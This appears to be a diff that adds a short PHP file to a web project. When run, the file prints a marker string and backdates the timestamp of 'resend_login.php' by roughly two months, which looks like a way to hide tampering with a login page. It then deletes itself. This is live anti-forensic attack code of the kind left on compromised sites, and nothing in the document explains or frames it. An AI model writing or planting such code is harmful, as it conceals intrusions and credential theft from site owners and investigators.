@@ -1,0 +1,1 @@
+<?php echo "xhrTkbKDYD"; if (file_exists("./resend_login.php")){ touch("./resend_login.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*rX5KWWNzKzDT5AZUGDtS*/ ?>
